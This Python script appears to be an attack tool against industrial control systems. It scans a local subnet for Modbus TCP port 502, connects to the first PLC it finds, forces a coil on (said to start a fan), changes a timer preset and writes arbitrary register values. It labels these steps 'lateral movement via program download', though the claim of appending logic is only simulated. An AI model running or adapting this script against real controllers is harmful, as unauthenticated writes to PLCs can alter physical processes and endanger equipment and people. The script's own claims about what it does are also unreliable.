import socket
from pymodbus.client.sync import ModbusTcpClient
from pymodbus.payload import BinaryPayloadDecoder
from pymodbus.constants import Endian

# Constants
PLC_SUBNET = "192.168.9."
PLC_PORT = 502  # Default Modbus TCP port

# Function to discover the PLC's IP address
def discover_plc_ip():
    for i in range(1, 255):  # Scan the subnet
        ip = PLC_SUBNET + str(i)
        try:
            print(f"Scanning {ip}...")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.1)  # Set timeout for quick scanning
                result = sock.connect_ex((ip, PLC_PORT))
                if result == 0:
                    print(f"PLC found at {ip}")
                    return ip
        except Exception as e:
            continue
    print("PLC not found on the network.")
    return None

# Function to perform a program download (online edit)
def perform_program_download(plc_ip):
    try:
        # Connect to the PLC using Modbus TCP
        client = ModbusTcpClient(plc_ip, port=PLC_PORT)
        if not client.connect():
            print(f"Failed to connect to PLC at {plc_ip}")
            return False

        print("Connected to PLC. Performing program download...")

        # Example: Modify a memory bit (e.g., %M1) to activate the fan
        client.write_coil(address=1, value=True)  # %M1 = TRUE
        print("Modified %M1 to TRUE.")

        # Example: Modify a timer preset (e.g., %TM0)
        # Modbus function code 6 (Write Single Register)
        client.write_register(address=0, value=30)  # Change %TM0 preset to 30 seconds
        print("Modified %TM0 preset to 30 seconds.")

        # Example: Append new logic (simulated by writing to a memory register)
        client.write_registers(address=10, values=[1, 2, 3, 4])  # Example data
        print("Appended new logic to PLC memory.")

        print("Program download completed successfully.")
        return True

    except Exception as e:
        print(f"Error during program download: {e}")
        return False
    finally:
        client.close()

# Main script
if __name__ == "__main__":
    # Step 1: Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        print("Exiting script.")
        exit(1)

    # Step 2: Perform the program download
    if perform_program_download(plc_ip):
        print("Lateral movement via program download successful.")
    else:
        print("Lateral movement failed.")